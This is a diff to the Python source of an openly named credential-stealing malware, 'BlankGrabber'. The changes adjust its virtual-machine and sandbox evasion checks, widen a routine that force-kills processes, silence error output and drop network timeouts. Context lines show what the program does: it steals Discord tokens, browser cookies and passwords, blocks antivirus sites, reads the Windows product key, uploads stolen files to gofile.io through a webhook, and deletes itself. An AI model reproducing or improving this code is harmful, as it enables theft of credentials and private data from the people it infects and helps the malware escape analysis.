@@ -25,6 +25,9 @@ import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageSta
 if not hasattr(sys, "_MEIPASS"):
     sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Sets _MEIPASS if does not exist (py mode)
 
+if os.getenv("BG-DEBUG", True): # Set environment variable `BG-DEBUG` to False to prevent error messages from being displayed
+    print = lambda x: None
+
 class Settings:
 
     Webhook = "%webhook%"
@@ -73,7 +76,7 @@ class VmProtect:
 
     @staticmethod
     def checkHosting() -> bool: # Checks if the user's system in running on a server or not
-        http = PoolManager(timeout= 10.0)
+        http = PoolManager()
         try:
             return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
         except Exception:
@@ -83,7 +86,7 @@ class VmProtect:
     def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
         http = PoolManager(timeout= 1.0)
         try:
-            http.request('GET', f'https://blank{Utility.GetRandomString()}.in')
+            http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
         except Exception:
             return False
         else:
@@ -98,13 +101,13 @@ class VmProtect:
         return (r1.returncode != 1 and r2.returncode != 1) or gpucheck or dircheck
 
     @staticmethod
-    def killTasks() -> None: # Kills blacklisted processes
+    def killTasks(*tasks: str) -> None: # Kills blacklisted processes
         out = (subprocess.run('tasklist /FO LIST', shell= True, capture_output= True).stdout.decode(errors= 'ignore')).strip().split('\r\n\r\n')
         for i in out:
             i = i.split("\r\n")[:2]
             try:
                 name, pid = i[0].split()[-1].rstrip('.exe'), int(i[1].split()[-1])
-                if not name in VmProtect.BLACKLISTED_TASKS:
+                if not name in (tasks or VmProtect.BLACKLISTED_TASKS):
                     continue
                 subprocess.Popen('taskkill /F /PID %d' % pid, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
             except Exception:
@@ -113,7 +116,7 @@ class VmProtect:
     @staticmethod
     def isVM() -> bool: # Checks if the user is running on a VM or not
         Thread(target= VmProtect.killTasks, daemon= True).start()
-        return VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry() or VmProtect.checkHTTPSimulation()
+        return VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
 
 class Errors:
 
@@ -282,7 +285,7 @@ class Utility:
     
     @staticmethod
     def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
-        http = PoolManager(timeout= 10.0)
+        http = PoolManager()
         try:
             return http.request("GET", "https://gstatic.com/generate_204").status == 204
         except Exception:
@@ -501,7 +504,7 @@ class Browsers:
 
 class Discord:
 
-    httpClient = PoolManager(timeout= 10.0) # Client for http requests
+    httpClient = PoolManager() # Client for http requests
     ROAMING = os.getenv("appdata") # Roaming directory
     LOCALAPPDATA = os.getenv("localappdata") # Local application data directory
     REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}" # Regular expression for matching tokens
@@ -1077,8 +1080,7 @@ class BlankGrabber:
     def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
         if Settings.BlockAvSites:
             Utility.BlockSites()
-            for process in ("chrome", "firefox", "msedge", "safari", "opera", "iexplore"):
-                subprocess.Popen("taskkill /F /IM {}.exe".format(process), shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            VmProtect.killTasks("chrome", "firefox", "msedge", "safari", "opera", "iexplore")
     
     @Errors.Catch
     def StealBrowserData(self) -> None: # Steal cookies, passwords and history from the browsers
@@ -1302,7 +1304,7 @@ class BlankGrabber:
 
             if filename is None:
                 filename = os.path.basename(path)
-            http = PoolManager(timeout= 10.0)
+            http = PoolManager()
 
             try:
                 server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode())["data"]["server"]
@@ -1324,7 +1326,7 @@ class BlankGrabber:
             gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
             productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
 
-            http = PoolManager(timeout= 10.0)
+            http = PoolManager()
 
             try:
                 r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
@@ -1452,8 +1454,7 @@ if __name__ == "__main__" and os.name == "nt":
                 else:
                     time.sleep(10) # Wait for 10 seconds and check the internet connection again
             except Exception as e:
-                if Utility.GetSelf()[1]:
-                    print("Main Error: " + str(e)) # Print the error message (exe mode)
+                print("Main Error: " + str(e)) # Print the error message
                 time.sleep(600) # Wait for 10 minutes and try again
         
         if Utility.GetSelf()[1] and Settings.Melt and not Utility.IsInStartup(): # Delete the file if melt option is enabled and the file is not in the startup (exe mode)
